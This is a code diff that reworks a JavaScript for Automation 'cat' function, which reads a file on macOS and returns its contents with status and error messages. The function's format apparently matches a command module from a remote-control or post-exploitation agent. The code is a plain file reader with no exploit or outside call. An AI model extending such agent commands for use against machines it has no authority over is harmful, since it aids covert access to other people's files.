@@ -1,19 +1,24 @@
 exports.cat = function(task, command, params){
     try{
-        let contents = $.NSString.stringWithContentsOfFileEncodingError($(params), $.NSUTF8StringEncoding, $());
-        if(contents === undefined || contents === ""){
-            return JSON.stringify({"user_output": "No output from command", "completed": true});
+        let command_params = JSON.parse(params);
+        if(!command_params.hasOwnProperty('path')){return {"user_output": "Missing path parameter", "completed": true, "status": "error"}}
+        let contents = $.NSString.stringWithContentsOfFileEncodingError($(command_params['path']), $.NSUTF8StringEncoding, $()).js;
+        if(contents === ""){
+            return {"user_output": "No output from command", "completed": true};
         }
-        if(contents === true){
-            return JSON.stringify({"user_output": "True", "completed": true});
+        else if(contents === true){
+            return {"user_output": "True", "completed": true};
         }
-        if(contents === false){
-            return JSON.stringify({"user_output": "False", "completed": true});
+        else if(contents === false){
+            return{"user_output": "False", "completed": true};
         }
-        return JSON.stringify({"user_output": contents, "completed": true});
+        else if(contents === undefined){
+            return {"user_output": "Failed to read file. Either you don't have permissions or the file doesn't exist", "completed": true, "status": "error"};
+        }
+        return {"user_output": contents, "completed": true};
     }
     catch(error){
-        return JSON.stringify({"user_output": error.toString(), "status": "error", "completed": true});
+        return {"user_output": error.toString(), "status": "error", "completed": true};
     }
 };
 COMMAND_ENDS_HERE
